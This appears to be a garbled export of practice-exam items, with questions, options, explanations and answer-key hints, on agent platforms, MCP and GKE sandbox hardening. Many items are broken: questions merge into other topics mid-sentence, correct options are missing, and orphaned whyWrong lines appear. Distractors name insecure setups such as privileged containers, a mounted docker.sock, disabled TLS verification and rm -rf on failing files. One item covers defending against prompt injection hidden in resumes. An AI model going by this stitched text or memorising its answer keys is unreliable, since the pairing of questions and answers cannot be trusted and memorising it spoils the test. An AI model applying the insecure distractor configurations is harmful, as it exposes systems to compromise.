options: Use a BigQuery scheduled query to send an email 24 hours later.
Delete all flow-level handlers and copy-paste identical handlers onto all 25 pages individually.
Disconnect every caller immediately after 1 second of silence on all pages.

Define the default `sys.no-input-1` and `sys.no-input-2` event handlers once at the `Customer Service Flow` level, and define a single overriding page-level `sys.no-input-1` event handler specifically on the `Serial Number Lookup Page`.
explanation: CX Agent Studio supports hierarchical event handler inheritance. Flow-level event handlers act as defaults for all pages within that flow, while a page-level event handler for the same event (`sys.no-input-1`) takes precedence on that specific page, allowing clean override behavior without duplication.

whyWrong.0: Asynchronous emails do not solve real-time telephony silence handling.
whyWrong.1: Copy-pasting identical handlers across 25 pages violates DRY principles and creates high maintenance burden.
whyWrong.2: Disconnecting callers after 1 second ruins the customer experience.

hint: Core Rule (CX Agent Studio: Flow-Level vs Page-Level Event Handlers): CX Agent Studio supports hierarchical event handler inheritance.

topic: Agent Search: Cloud SQL & Relational Database Grounding
question: A healthcare provider stores its directory of 18,000 credentialed physicians, their accepted insurance plans, clinic addresses, and live appointment availability flags in a Cloud SQL for PostgreSQL database. topic: Gemini Enterprise Agent Designer: Tool Input/Output Schema Validation
question: You are configuring an OpenAPI tool in Gemini Enterprise Agent Designer that interacts with an enterprise ERP system to create purchase requisitions. Include clear descriptions and semantic formatting hints on the response properties in the OpenAPI schema so the playbook interprets the returned fields accurately.
Configure the API to return a 50 MB uncompressed XML dump on every call.
Delete the `requisition_id` from the response so the agent can never confirm the order number.
Encode all JSON responses in Base64 twice before returning them to the LLM.

topic: State-Based Workflows: Composite Entities & Slot Filling
question: A pizza delivery chain is building an ordering flow in CX Agent Studio. When a customer says 'I want two large pepperoni pizzas and one small garlic knots', the agent needs to capture the quantity, size, and item name as a grouped structure rather than mixing up which size belongs to which item. How should you model this in CX Agent Studio's entity and form design?
options: Create three separate scalar parameters (`quantity`, `size`, `item`) on three different pages and ask the user to order only one item per phone call.

Create a Composite Entity (e.g., `@order_item`) composed of child entities `@sys.number:quantity`, `@size:size`, and `@menu_item:item`, and configure a form parameter with `@order_item` checked as 'Is List'.
Use `@sys.any` to capture the entire sentence and mail it to the restaurant manager.
Disable NLU entity extraction and require customers to enter binary ASCII codes.
explanation: Composite Entities in CX Agent Studio allow grouping multiple sub-entities (such as quantity, size, and menu item) into a single structured object. Marking the composite entity form parameter as a list (`isList: true`) allows the agent to extract multiple structured items (`[{quantity: 2, size: 'large', item: 'pepperoni pizza'}, {quantity: 1, size: 'small', item: 'garlic knots'}]`) from a single utterance without mismatching attributes.

whyWrong.0: Separate scalar lists (`quantities = [2, 1]`, `sizes = ['large', 'small']`) risk index misalignment when an item omits an optional attribute.
whyWrong.2: Using `@sys.any` forfeits structured slot validation and automated inventory pricing lookups.
whyWrong.3: Requiring binary ASCII codes destroys conversational usability.

hint: Core Rule (State-Based Workflows: Composite Entities & Slot Filling): Composite Entities in CX Agent Studio allow grouping multiple sub-entities (such as quantity, size, and menu item) into a single structured object.

topic: System Instructions Engineering: Output Formatting & Markdown Control

Hardcode raw HTML `<table>` tags into all SMS responses.

topic: CX Agent Studio: Conditional Transition Routes & Boolean Logic
question: In a CX Agent Studio loan pre-qualification flow, the agent collects `$session.params.credit_score`, `$session.params.annual_income`, and `$session.params.has_bankruptcy`. How should you write this condition expression on the transition route to the `Instant Approval Page`?
options: `$session.params.has_bankruptcy = true OR $session.params.credit_score < 500`
`$session.params.credit_score OR $session.params.annual_income == 'true'`
`if (credit_score > 720) { goto InstantApproval; }`
`$session.params.credit_score >= 720 AND $session.params.annual_income > 85000 AND $session.params.has_bankruptcy = false`
explanation: CX Agent Studio conditional transition routes support standard compound boolean expressions using `AND`, `OR`, `NOT`, and comparison operators (`>=`, `>`, `=`, `!=`). Combining all three conditions with `AND` ensures deterministic routing only when every underwriting criterion is met.

whyWrong.0: This condition matches applicants who have a bankruptcy or low credit score—the exact opposite of the business rule.
whyWrong.1: Using `OR` and comparing numbers to `'true'` evaluates incorrectly.
whyWrong.2: C/JavaScript `if (...) { goto ... }` syntax is invalid in CX Agent Studio condition expressions.

hint: Core Rule (CX Agent Studio: Conditional Transition Routes & Boolean Logic): CX Agent Studio conditional transition routes support standard compound boolean expressions using `AND`, `OR`, `NOT`, and comparison operators (`>=`, `>`, `=`, `!=`).

topic: Agent Search: Extractive Answers vs Generative Summarization

topic: Multimodal Data Ingestion: PDF Form & Invoice Processing
question: A freight brokerage receives hundreds of carrier rate confirmation sheets daily as scanned PDF attachments uploaded by drivers into a CX Agent Studio chat portal. topic: State-Based Workflows: Loop Prevention & Max Turn Counters
question: While auditing call logs for a CX Agent Studio state-based troubleshooting flow, you discover a defect where certain customers get trapped in an infinite loop between the `Check Cable Page` and the `Reboot Device Page` when their hardware refuses to power on. Each transition back and forth increments a webhook call, costing money and frustrating callers. How should you modify the state-based workflow to guarantee that no user can loop through the `Reboot Device Page` more than twice before being escalated to a human technician?
options: Use Parameter Presets on the entry fulfillment of `Reboot Device Page` to increment a session counter `$session.params.reboot_count` using `$sys.func.ADD($session.params.reboot_count, 1)`, and place a high-priority conditional transition route (`$session.params.reboot_count > 2`) that routes immediately to the `Live Agent Escalation Page`.
Remove the `Reboot Device Page` so the agent never suggests rebooting.
Wait for the customer's phone battery to die.
Set the Google Cloud project billing budget to $5 so the entire company's cloud infrastructure shuts down when a loop occurs.
explanation: Using `$sys.func.ADD()` inside parameter presets increments a loop counter deterministically each time the page is visited. Evaluating a high-priority condition route (`$session.params.reboot_count > 2`) breaks the cycle automatically and transitions the user to human escalation.

whyWrong.1: Removing a standard troubleshooting step degrades self-service resolution rates.
whyWrong.2: Relying on caller abandonment is terrible customer service.
whyWrong.3: Shutting down production cloud infrastructure via billing caps causes a total outage for all customers.

hint: Core Rule (State-Based Workflows: Loop Prevention & Max Turn Counters): Using `$sys.func.ADD()` inside parameter presets increments a loop counter deterministically each time the page is visited.

topic: Chain-of-Thought Prompt Templates: Multi-Constraint Reasoning

topic: Agent Search: Custom Metadata & Document-Level Filtering
question: A global pharmaceutical enterprise operates in 40 countries, each with strict national drug regulatory authorities (e.g., FDA in the US, EMA in Europe, PMDA in Japan). Pass a mandatory filter condition in the CX Agent Studio data store tool configuration (e.g., `jurisdiction: ANY("$session.params.user_country_code")`) populated from the authenticated physician's profile.
Rely exclusively on a system instruction prompt that says 'Try not to use American documents if the user sounds Japanese'.

topic: System Instructions Engineering: Preventing Indirect Prompt Injection via RAG
question: A recruiting firm uses a Gemini Enterprise Agent Designer agent to screen candidate resumes uploaded as PDFs into an Agent Search data store. options: Tell recruiters to hold every printed resume up to a bright light bulb before uploading.

Enforce strict privilege separation by removing high-privilege scheduling tools (`schedule_final_ceo_interview`) from the resume summarization playbook, use system instruction spotlighting/delimiters that explicitly mark retrieved resume text as untrusted data (`<untrusted_candidate_resume>...</untrusted_candidate_resume>`), and instruct the model never to follow imperative commands found inside data blocks.
Set the model temperature to 1.0 so it ignores instructions randomly.
Grant candidate resume PDFs root access to the calendar API.
explanation: Defending against indirect prompt injection from untrusted documents requires (1) structural delimiters/spotlighting in system instructions clearly separating untrusted retrieved data from system directives, (2) explicit negative constraints instructing the LLM to treat content within data tags purely as passive information, and (3) least-privilege tool isolation so untrusted document processing playbooks cannot directly invoke state-mutating external tools.

whyWrong.0: Manual physical inspection is impossible for digital PDF uploads.
whyWrong.2: High temperature does not mitigate indirect prompt injection.
whyWrong.3: Granting untrusted inputs direct API privileges maximizes attack impact.

hint: Core Rule (System Instructions Engineering: Preventing Indirect Prompt Injection via RAG): Defending against indirect prompt injection from untrusted documents requires (1) structural delimiters/spotlighting in system instructions clearly separating untrusted retrieved data from system directives, (2) explicit negative constraints instructing the LLM to treat content within data tags purely as passive information, and (3) least-privilege tool isolation so untrusted document processing playbooks cannot directly invoke state-mutating external tools.

topic: MCP Servers & Tool Access

options: Run the coding agents in privileged Docker containers on standard Container-Optimized OS nodes with hostNetwork: true and rely on iptables scripts executed inside the container entrypoint.

Deploy the coding agents on Compute Engine preemptible VMs with default service accounts and full cloud-platform scope enabled.
Use Cloud Functions 2nd gen with default VPC egress settings to run arbitrary shell commands generated by the coding agent.
explanation: GKE Sandbox uses gVisor (runsc) to provide an application kernel that intercepts and implements Linux system calls in userspace, preventing untrusted agent-generated code from directly accessing the host kernel. whyWrong.0: Privileged containers with hostNetwork: true completely bypass container isolation and allow trivial container escape to the underlying GKE node.
whyWrong.2: Compute Engine VMs with default service accounts and cloud-platform scope grant excessive project-wide permissions to untrusted code.
whyWrong.3: Cloud Functions with default VPC egress allow unrestricted outbound internet access and lack configurable Kubernetes NetworkPolicy controls per agent session.

hint: Core Rule (Secure Sandboxes (GKE & Cloud Workstations)): GKE Sandbox uses gVisor (runsc) to provide an application kernel that intercepts and implements Linux system calls in userspace, preventing untrusted agent-generated code from directly accessing the host kernel.

topic: Application-Layer Vulnerability Patching

whyWrong.3: Deleting functional HTTP endpoints breaks API contracts and application availability rather than remediating the vulnerability.
whyWrong.4: Suppressing SAST alerts with ignore comments masks the vulnerability instead of fixing it.

whyWrong.1: Over-provisioning infrastructure increases cloud spend without fixing underlying algorithmic inefficiencies or lock contention.
whyWrong.2: Removing authentication middleware introduces catastrophic security vulnerabilities in a payment processing service.

topic: MCP Transport Protocols (stdio vs SSE)
question: You are architecting MCP server connectivity for two distinct use cases: (1) a local developer running Claude Code on their Cloud Workstation who needs a lightweight filesystem AST parser running as a child process, and (2) a centralized enterprise Jira/Confluence MCP server hosted on Cloud Run accessed concurrently by 500 remote coding agents. options: Use public unauthenticated UDP broadcast sockets for both local and remote MCP servers.
Use stdio transport over SSH port forwarding across the public internet for all 500 remote coding agents connecting to Cloud Run.

Use stdio transport for the local child-process AST parser on the Cloud Workstation, and use HTTP with Server-Sent Events (SSE) / Streamable HTTP transport authenticated via Google Cloud IAM for the centralized Cloud Run MCP server.
Use SMTP email attachments to exchange JSON-RPC messages between the coding agent and the local AST parser.
explanation: The Model Context Protocol (MCP) defines stdio transport for low-latency local subprocess communication where the client spawns the server directly, and HTTP/SSE (or Streamable HTTP) transport for remote, multi-tenant, stateless or stateful network services deployed on platforms like Cloud Run.

whyWrong.0: MCP is built on JSON-RPC 2.0 and does not use unauthenticated UDP broadcast sockets.

whyWrong.3: SMTP email is an asynchronous messaging protocol unsuitable for real-time interactive JSON-RPC tool invocations.

hint: Core Rule (MCP Transport Protocols (stdio vs SSE)): The Model Context Protocol (MCP) defines stdio transport for low-latency local subprocess communication where the client spawns the server directly, and HTTP/SSE (or Streamable HTTP) transport for remote, multi-tenant, stateless or stateful network services deployed on platforms like Cloud Run.

whyWrong.4: Disabling HTTPS exposes JSON-RPC payloads and authentication headers to network interception.

topic: Custom Skills Metadata & Invocation

How does Antigravity achieve this token-efficient skill discovery?
options: By concatenating every SKILL.md file in the enterprise registry into the initial system prompt for every single turn.
By requiring the user to manually type the exact SHA-256 hash of the SKILL.md file in every prompt.
By compressing the SKILL.md file into a JPEG image and passing it to a vision model.

By parsing the concise `name`, `description`, and `trigger` fields in the SKILL.md YAML frontmatter during session initialization, and dynamically loading the full markdown body into context only when the user intent matches the skill description.
explanation: Antigravity uses progressive context loading for skills: only the lightweight metadata from the YAML frontmatter (`name`, `description`, `triggers`) is loaded initially so the agent knows what capabilities exist. When the agent determines a skill is relevant, it dynamically reads the full `SKILL.md` body into context.

whyWrong.0: Concatenating all skills into every system prompt wastes context window capacity and increases token cost and latency.
whyWrong.1: Requiring users to type SHA-256 hashes breaks natural language ergonomics and autonomous agent discovery.
whyWrong.2: Converting markdown text to JPEG images degrades text accuracy and wastes multimodal tokens.

hint: Core Rule (Custom Skills Metadata & Invocation): Antigravity uses progressive context loading for skills: only the lightweight metadata from the YAML frontmatter (`name`, `description`, `triggers`) is loaded initially so the agent knows what capabilities exist.

topic: Workspace Rules & Architectural Enforcement
question: A frontend engineering team uses Antigravity to build a Next.js application. In a temporary scratch file stored in `/tmp` on a single developer's laptop.
In a Cloud DNS TXT record associated with the company's marketing domain.
In the commit message of the initial commit from three years ago.

whyWrong.1: Files in `/tmp` on a single laptop are ephemeral and not shared with teammates or CI/CD agents.
whyWrong.2: Cloud DNS TXT records are not read by coding agents as workspace instructions.
whyWrong.3: Historical commit messages are not automatically loaded into the active system instructions of coding agents.

hint: Core Rule (Workspace Rules & Architectural Enforcement): Checking workspace rule files (e.g., `.antigravity/rules.md` or `.claude/CLAUDE.md`) into the root of the Git repository ensures that every coding agent session launched within that workspace automatically inherits the project's architectural and stylistic conventions.

topic: Extension Hooks (Post-Tool Execution)
question: In a large TypeScript monorepo, whenever a coding agent modifies a `.ts` file using its file-edit tool, developers notice that the agent occasionally leaves minor formatting inconsistencies or missing import sorting that violate Prettier and ESLint rules. You want every agent file modification to be automatically formatted and lint-fixed immediately after the edit tool completes, before the agent takes its next reasoning step. What should you configure?
options: Configure a pre-tool hook that blocks all file edits if the file is not already formatted.
Wait until the end of the quarter and run a manual formatting script across the repository.

Configure a post-tool extension hook bound to file-edit/write tools that runs `eslint --fix` and `prettier --write` on the modified file path and returns any remaining unfixable lint errors to the agent's observation stream.
Disable TypeScript strict mode in `tsconfig.json` so compiler errors are hidden.
explanation: Post-tool extension hooks run immediately after a tool execution finishes. By executing `prettier --write` and `eslint --fix` on the touched file in a post-tool hook, formatting is normalized deterministically, and any remaining syntax or lint errors are appended to the tool output so the agent can immediately fix them in its next turn.

whyWrong.0: A pre-tool hook runs before the edit is written to disk, so it cannot format the newly proposed changes on disk.
whyWrong.1: Quarterly manual formatting leaves broken builds and noisy diffs throughout the development cycle.
whyWrong.3: Disabling strict mode degrades code quality and does not solve formatting or lint violations.

hint: Core Rule (Extension Hooks (Post-Tool Execution)): Post-tool extension hooks run immediately after a tool execution finishes.

topic: GKE Sandbox Isolation (Kata vs gVisor)
question: You are designing a multi-tenant cloud IDE platform on GKE where autonomous coding agents compile and test untrusted C++ and Rust kernel eBPF programs submitted by external contractors. Because compiling and testing eBPF programs requires specific Linux syscall compatibility and hardware virtualization boundaries, you need to evaluate GKE Sandbox (gVisor) versus Kata Containers on nested virtualization node pools. Which two architectural statements accurately guide your selection? (Choose two.)
options: Kata Containers run each pod inside a lightweight hardware-virtualized microVM with its own dedicated guest Linux kernel, providing strong hardware isolation and high syscall compatibility for low-level workloads.
GKE Sandbox (gVisor) grants containers direct root access to the host node's physical GPU PCIe bus without syscall filtering.

GKE Sandbox (gVisor) intercepts syscalls in a user-space application kernel (`runsc`), offering fast container startup and low memory overhead, but may reject specialized syscalls like `bpf()` required for loading kernel eBPF programs.
Kata Containers run all pods in a single shared OS process without memory isolation.
Standard Docker containers with `--privileged` provide stronger kernel isolation than both gVisor and Kata Containers.
explanation: gVisor (`runsc`) implements a user-space syscall interception layer that provides strong isolation with minimal overhead for standard web/microservice workloads, but intentionally restricts low-level kernel syscalls like `bpf()`. Kata Containers encapsulate each pod inside a lightweight hardware-isolated microVM with a dedicated guest kernel, enabling full syscall compatibility for workloads like eBPF while preserving strict multi-tenant host isolation.

whyWrong.1: gVisor strictly mediates hardware and syscall access; it never grants raw unfiltered PCIe host bus root access.
whyWrong.3: Kata Containers provide separate guest kernels and hardware memory isolation per microVM, not a shared process.
whyWrong.4: Privileged Docker containers effectively disable isolation and expose the host kernel to full compromise.

hint: Core Rule (GKE Sandbox Isolation (Kata vs gVisor)): gVisor (`runsc`) implements a user-space syscall interception layer that provides strong isolation with minimal overhead for standard web/microservice workloads, but intentionally restricts low-level kernel syscalls like `bpf()`.

topic: Human-in-the-Loop (HITL) Modes in Agents CLI
question: Your DevOps team uses Antigravity with an infrastructure MCP server capable of executing `terraform apply` and `gcloud iam` commands. Revoke all tool access from the coding agent so it can only write poems about Terraform.
Require human approval for every single character typed or file read by the coding agent.

Configure tool permission rules in Antigravity / Agents CLI categorizing read-only tools (`plan`, `describe`, `view_file`) under `agent-auto` mode and state-mutating tools (`apply`, `destroy`, `iam policy set`) under `human-approval-required` (HITL) mode.
explanation: Antigravity and Agents CLI support granular tool execution policies that distinguish between safe read-only operations (`agent-auto` mode) and destructive/state-mutating operations (`human-approval-required` / HITL mode). This preserves autonomous velocity during discovery and planning while enforcing human oversight before mutations occur.

whyWrong.0: Unrestricted autonomous execution (`yolo` mode) in production risks catastrophic infrastructure deletion before billing alerts fire.
whyWrong.1: Revoking all tools eliminates the agent's ability to inspect state or generate validated plans.
whyWrong.2: Requiring human approval for every file read causes severe alert fatigue and stalls development.

hint: Core Rule (Human-in-the-Loop (HITL) Modes in Agents CLI): Antigravity and Agents CLI support granular tool execution policies that distinguish between safe read-only operations (`agent-auto` mode) and destructive/state-mutating operations (`human-approval-required` / HITL mode).

topic: AST-Aware Code Refactoring
question: A software architect needs an Antigravity coding agent to rename a heavily overloaded method `processTransaction(ctx, payload)` across a 2-million-line Java codebase, updating only calls to `PaymentProcessor.processTransaction` while leaving identically named methods on `AuditLogger.processTransaction` and `FraudEngine.processTransaction` untouched. Why should you configure the coding agent with an LSP (Language Server Protocol) or Tree-sitter AST MCP tool rather than relying on `grep` and regex replacement?
options: LSP and AST tools resolve semantic type bindings and symbol references across the compilation graph, allowing the agent to precisely target `PaymentProcessor.processTransaction` call sites without corrupting unrelated classes that share the same method name.
Regex replacement runs too slowly on SSD drives compared to spinning up a Java Language Server.
Grep and regex are incapable of matching ASCII characters in UTF-8 files.
AST tools automatically deploy compiled JAR files to production without running unit tests.
explanation: Text-based regex tools (`grep`/`sed`) lack semantic type awareness and cannot reliably distinguish between overloaded or identically named methods on different classes or interfaces. Providing an LSP or Tree-sitter AST MCP tool gives the coding agent exact symbol resolution, call hierarchy analysis, and safe semantic refactoring capabilities.

whyWrong.1: Regex text scanning is computationally fast; its limitation is semantic ambiguity, not raw disk speed.
whyWrong.2: Grep and regex handle ASCII and UTF-8 text natively.
whyWrong.3: AST tools parse and transform syntax trees; they do not deploy artifacts or bypass test suites.

hint: Core Rule (AST-Aware Code Refactoring): Text-based regex tools (`grep`/`sed`) lack semantic type awareness and cannot reliably distinguish between overloaded or identically named methods on different classes or interfaces.

topic: Subagent Token Budget & Context Isolation
question: When an Antigravity parent agent delegates a complex debugging task to a specialized `log-analyzer` subagent, the subagent scans 10,000 lines of verbose stack traces and Cloud Logging JSON payloads. If the subagent returns its entire raw conversation history and all 10,000 log lines back to the parent agent, the parent agent's context window immediately overflows. How should the parent-subagent handoff be architected?
options: Configure the parent agent and subagent to share a single global mutable context buffer so every log line is duplicated twice.

Configure the subagent with an isolated ephemeral context window and enforce a structured output schema (such as a concise root-cause JSON summary with file/line pointers) as the sole message returned to the parent agent.
Instruct the subagent to delete the production Cloud Logging bucket after reading the logs.
Limit the parent agent to a maximum of 50 tokens for its entire session.
explanation: A primary benefit of subagent delegation is context isolation: the subagent absorbs noisy, high-volume intermediate data (such as 10,000 log lines or verbose test outputs) within its own ephemeral context window and returns only a distilled, structured summary (e.g., root cause, affected file, and recommended fix) to the parent orchestrator.

whyWrong.0: Sharing a single mutable context buffer defeats context isolation and causes immediate token exhaustion.
whyWrong.2: Deleting production log buckets destroys audit trails and violates operational compliance.
whyWrong.3: A 50-token limit renders the parent agent incapable of holding system instructions or reasoning.

hint: Core Rule (Subagent Token Budget & Context Isolation): A primary benefit of subagent delegation is context isolation: the subagent absorbs noisy, high-volume intermediate data (such as 10,000 log lines or verbose test outputs) within its own ephemeral context window and returns only a distilled, structured summary (e.g., root cause, affected file, and recommended fix) to the parent orchestrator.

topic: Patching SSRF & XSS Vulnerabilities
question: An Antigravity coding agent is remediating two security findings in a Node.js Express web application: (1) a Reflected Cross-Site Scripting (XSS) vulnerability where unescaped user search input is rendered directly into an HTML response, and (2) a Server-Side Request Forgery (SSRF) vulnerability where a webhook preview endpoint fetches arbitrary user-supplied URLs, including internal metadata IP `169.254.169.254`. Which two code remediation patterns should the agent implement? (Choose two.)
options: For SSRF, add an HTTP header `X-Please-Do-Not-Hack: true` to outbound requests made to `169.254.169.254`.

For SSRF, parse the user-supplied URL, enforce a strict HTTPS scheme and domain allowlist, and block resolution of private/link-local IP ranges (RFC 1918 and `169.254.169.254`) in a custom DNS lookup hook.
For XSS, encrypt the HTTP response body using ROT13 cipher before sending it to the browser.
For XSS, replace raw string concatenation with context-aware HTML output encoding or a secure templating engine that auto-escapes untrusted variables before rendering.
Disable TLS certificate verification globally (`NODE_TLS_REJECT_UNAUTHORIZED=0`) to speed up webhook previews.
explanation: Remediating XSS requires context-aware output encoding or auto-escaping template engines so untrusted input cannot inject executable `<script>` tags. Remediating SSRF requires strict URL parsing, domain/scheme allowlisting, and blocking private/link-local IP ranges (especially cloud metadata endpoints like `169.254.169.254`) at DNS resolution and socket connection time.

whyWrong.0: Custom HTTP headers do not prevent SSRF metadata exfiltration when the server fetches internal endpoints.
whyWrong.2: ROT13 is a trivial substitution cipher, not an HTML encoding mechanism, and breaks browser rendering.
whyWrong.4: Disabling TLS certificate verification introduces Man-in-the-Middle (MitM) vulnerabilities.

hint: Core Rule (Patching SSRF & XSS Vulnerabilities): Remediating XSS requires context-aware output encoding or auto-escaping template engines so untrusted input cannot inject executable `<script>` tags.

topic: Antigravity CLI Batch Execution & Guardrails

To prevent runaway token costs or infinite reasoning loops if a repository has broken dependencies, how should you invoke the Antigravity CLI inside each repository's build step?

Start an interactive Antigravity GUI session on a persistent Compute Engine VM and leave a macro clicking the 'Continue' button every 5 seconds.
Invoke the Antigravity CLI without flags and attach a billing credit card with no spending limits.
Use standard `find` and `rm -rf` bash commands to delete files that fail to compile.

whyWrong.2: Running without turn/token caps exposes the organization to runaway costs if an agent gets stuck in a retry loop.
whyWrong.3: Deleting files that fail to compile destroys application logic rather than upgrading the logging library.

hint: Core Rule (Antigravity CLI Batch Execution & Guardrails): When running Antigravity CLI in automated batch pipelines, passing `--prompt-file` ensures consistent task instructions while `--max-turns` and `--max-tokens` enforce hard upper bounds on agentic iterations and LLM token spend, preventing runaway loops on broken repositories.

topic: Claude Code on Google Cloud & Prompt Caching
question: Your developers use Claude Code on Google Cloud via Vertex AI to perform iterative multi-turn debugging on a massive C++ embedded systems repository. How should you optimize latency and cost without reducing context quality?

Enable Vertex AI context/prompt caching (`cache_control` breakpoints) on the static system instructions, MCP tool definitions, and shared repository header context in the Claude Code configuration.
Switch from Vertex AI Private Service Connect to a dial-up proxy server to throttle request rates.
Instruct developers to wait 24 hours between each debugging turn so quotas reset.
explanation: Vertex AI Model Garden supports prompt caching (`cache_control`) for Claude models. Marking static prefixes—such as system instructions, workspace rules, MCP tool schemas, and large reference files—as cached checkpoints reduces input token costs by up to 90% and significantly lowers time-to-first-token (TTFT) across multi-turn coding sessions.

whyWrong.0: Truncating header files removes essential type and function signatures, causing the agent to hallucinate invalid C++ code.
whyWrong.2: Throttling network connectivity degrades developer productivity without reducing token processing overhead.
whyWrong.3: Waiting 24 hours between turns paralyzes software development velocity.

hint: Core Rule (Claude Code on Google Cloud & Prompt Caching): Vertex AI Model Garden supports prompt caching (`cache_control`) for Claude models.

topic: MCP Resources vs Tools Architecture
question: You are building a custom enterprise MCP server for your internal developer platform. You want coding agents to be able to read immutable Architecture Decision Records (ADRs) and Protobuf API schemas for context, and separately trigger an automated staging deployment pipeline. According to Model Context Protocol design principles, how should you expose these capabilities?
options: Expose both read-only documents and deployment triggers as raw SQL queries executed over an unauthenticated telnet port.
Embed all 5,000 ADRs inside the MCP server's error message strings.

Expose the ADRs and Protobuf schemas as URI-addressable MCP Resources (`resources/list` and `resources/read`), and expose the staging deployment trigger as an executable MCP Tool (`tools/call`) with input schema validation.
Expose the deployment trigger as a static read-only markdown file and expect the LLM's thoughts alone to deploy the containers.
explanation: In MCP architecture, Resources represent read-only, URI-addressable data entities (like documentation, schemas, or logs) that clients/agents can read into context without side effects, whereas Tools represent executable functions (`tools/call`) that perform computations or side-effecting operations like triggering deployments.

whyWrong.0: Unauthenticated telnet SQL ports violate MCP specifications and introduce severe security vulnerabilities.
whyWrong.1: Stuffing documentation into error strings breaks protocol semantics and pollutes context windows.
whyWrong.3: Static markdown files cannot execute side effects or trigger external deployment pipelines.

hint: Core Rule (MCP Resources vs Tools Architecture): In MCP architecture, Resources represent read-only, URI-addressable data entities (like documentation, schemas, or logs) that clients/agents can read into context without side effects, whereas Tools represent executable functions (`tools/call`) that perform computations or side-effecting operations like triggering deployments.

topic: Hardening GKE Sandboxes for Coding Agents
question: Your security team is auditing the Kubernetes Pod Security Standards for ephemeral GKE pods that execute autonomous coding agent test suites. To minimize the blast radius if an agent executes malicious code inside a dependency package, which two Kubernetes security configurations should you enforce on the agent runner pods? (Choose two.)
options: Configure the container `securityContext` with `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`, and `capabilities.drop: ["ALL"]`, mounting an ephemeral `emptyDir` volume only at `/tmp` and `/workspace`.
Mount the host node's Docker socket (`/var/run/docker.sock`) inside the agent pod so it can spawn sibling root containers.
Set `automountServiceAccountToken: false` on the pod specification so untrusted code cannot steal Kubernetes API bearer tokens from `/var/run/secrets/kubernetes.io/serviceaccount`.
Set `privileged: true` and `runAsUser: 0` on all coding agent containers.
Bind the `cluster-admin` ClusterRole to the default namespace service account.
explanation: Enforcing `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`, and dropping all Linux capabilities prevents malicious code from modifying system binaries or exploiting kernel privilege escalation paths. Setting `automountServiceAccountToken: false` prevents compromised code from accessing the Kubernetes API server using mounted service account tokens.

whyWrong.1: Mounting `/var/run/docker.sock` grants root-equivalent control over the host node, enabling trivial container escape.
whyWrong.3: Running as root (`runAsUser: 0`) with `privileged: true` removes all container isolation boundaries.
whyWrong.4: Granting `cluster-admin` to default service accounts allows full compromise of the entire GKE cluster.

hint: Core Rule (Hardening GKE Sandboxes for Coding Agents): Enforcing `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`, and dropping all Linux capabilities prevents malicious code from modifying system binaries or exploiting kernel privilege escalation paths.

Declare an explicit `allowed-tools` (or tool allowlist) array in the `SKILL.md` YAML frontmatter listing only `view_file` and the specific `mcp__sqitch__verify` tool.

whyWrong.0: Polite natural language requests are non-deterministic and cannot guarantee security enforcement against prompt injection.
whyWrong.1: Running unverified scripts with superuser privileges risks catastrophic production data loss.
whyWrong.2: Renaming binaries on a single host is fragile security-by-obscurity and does not restrict agent tool calls.

hint: Core Rule (Custom Skills Tool Scoping (SKILL.md)): Defining `allowed-tools` in the `SKILL.md` YAML frontmatter instructs the Antigravity runtime to enforce a hard capability boundary for the duration of that skill's execution, restricting the agent exclusively to the declared read-only and verification tools.

topic: Extension Hooks for Dependency & Supply-Chain Security
question: Developers using Antigravity frequently ask their coding agents to add open-source libraries to solve data parsing tasks. Your security team discovered that agents occasionally install outdated npm or PyPI packages containing known High/Critical CVEs or typosquatted package names. How should you prevent vulnerable or unapproved dependencies from being added to projects by coding agents?

Block all internet access for the entire company and require developers to write their own JSON parser and HTTP client from scratch.
Wait for the annual external penetration test to discover vulnerable dependencies in production.
Instruct the coding agent to append `--ignore-scripts --force` to every package installation.
explanation: Intercepting package installation commands and manifest edits via a pre-tool extension hook allows deterministic verification against Google Cloud Artifact Analysis or OSV-Scanner databases before dependencies are downloaded or committed, immediately feeding CVE details back to the agent to select a patched version.

whyWrong.1: Rewriting standard libraries from scratch is economically unviable and introduces custom bugs.
whyWrong.2: Annual penetration testing leaves critical supply-chain vulnerabilities exposed in production for months.
whyWrong.3: Using `--force` bypasses dependency conflict checks without scanning for known CVEs.

hint: Core Rule (Extension Hooks for Dependency & Supply-Chain Security): Intercepting package installation commands and manifest edits via a pre-tool extension hook allows deterministic verification against Google Cloud Artifact Analysis or OSV-Scanner databases before dependencies are downloaded or committed, immediately feeding CVE details back to the agent to select a patched version.

topic: Subagent Delegation for Test-Driven Development (TDD)

How can you use Antigravity's subagent architecture to enforce genuine Test-Driven Development (TDD) and prevent test-implementation coupling?

Configure an orchestrator workflow that first delegates the requirements specification to a `test-engineer` subagent (with write access restricted to `tests/`) to author comprehensive failing tests, and then delegates implementation to a separate `developer` subagent (restricted from modifying `tests/`) whose goal is to make the test suite pass.
Delete all unit test files after the feature is implemented so there is no confirmation bias.
Run the same single-agent prompt twice with identical context windows.
explanation: Separating test authoring and feature implementation across two distinct subagents with isolated context windows and disjoint file-system write permissions (`tests/` vs `src/`) structurally eliminates confirmation bias. The implementation subagent must satisfy the immutable contract defined by the test-engineer subagent.

whyWrong.0: Prompt promises within a shared context window cannot prevent the LLM from conditioning its tests on implementation details already in context.
whyWrong.2: Deleting unit tests eliminates regression protection and CI/CD quality verification.
whyWrong.3: Running the same single-agent prompt twice repeats the same coupled reasoning flaw.

hint: Core Rule (Subagent Delegation for Test-Driven Development (TDD)): Separating test authoring and feature implementation across two distinct subagents with isolated context windows and disjoint file-system write permissions (`tests/` vs `src/`) structurally eliminates confirmation bias.

topic: Cloud Workstations Cost Optimization & Persistence
question: An enterprise operates 600 Cloud Workstations running Antigravity App for engineers across three global time zones. Cloud Billing reports show that many workstations remain running 24/7 even when developers leave for the evening, incurring unnecessary Compute Engine VM charges. However, developers require their `/home/user` workspace files, cloned Git repositories, and Antigravity session history to persist across restarts. What should you configure?
options: Delete the entire Cloud Workstations cluster every Friday night using Terraform destroy and recreate it on Monday morning.
Replace persistent disks with RAM disks (`tmpfs`) and set the idle timeout to 10 years.

Configure the Cloud Workstations idle timeout (`idleTimeout`) to automatically suspend or stop VMs after 30 minutes of inactivity, while attaching a persistent Compute Engine Persistent Disk mounted at `/home`.

topic: Patching Insecure Deserialization Vulnerabilities
question: A security audit flagged 18 Python microservices that use `pickle.loads()` and `yaml.load(data, Loader=yaml.Loader)` to deserialize session state from HTTP cookies, exposing the services to Remote Code Execution (RCE). You task an Antigravity coding agent with remediating these services. What remediation pattern should the agent apply and verify?
